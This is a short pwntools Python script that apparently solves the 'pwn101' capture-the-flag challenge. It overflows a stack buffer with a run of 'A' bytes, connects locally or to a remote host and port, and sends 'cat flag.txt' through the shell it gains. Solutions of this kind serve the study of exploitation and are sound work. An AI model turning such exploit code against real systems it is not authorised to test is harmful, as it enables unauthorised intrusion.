import argparse
import pwn

# ================================================
#                  Boilerplate
# ================================================

parser = argparse.ArgumentParser()
parser.add_argument('destination', type=str, choices={'local', 'remote'})
parser.add_argument('--target', '-t', type=str, required=False)
parser.add_argument('--port', '-p', type=str, required=False)
args = parser.parse_args()

# ================================================
#               Exploit generation
# ================================================

pwn.context.binary = binary = './pwn101.pwn101'
# pwn.context.log_level = 'debug'

payload = b'A' * ((0x40 - 0x4) + 1)

# ================================================
#              Local / GDB / Remote
# ================================================

if args.destination == 'local':
    p = pwn.process()
else:
    if not args.target or not args.port:
        pwn.error('Please provide target and port!')
        exit()
    p = pwn.remote(args.target, args.port)

# ================================================
#           Send exploit & Receive flag
# ================================================
p.recv()
if args.destination == 'remote':
    p.recv()
p.sendline(payload)
if args.destination == 'remote':
    p.recv()
p.recv()
p.sendline(b'cat flag.txt')
pwn.warning("Flag: " + p.recv().decode('utf-8'))
# p.interactive()
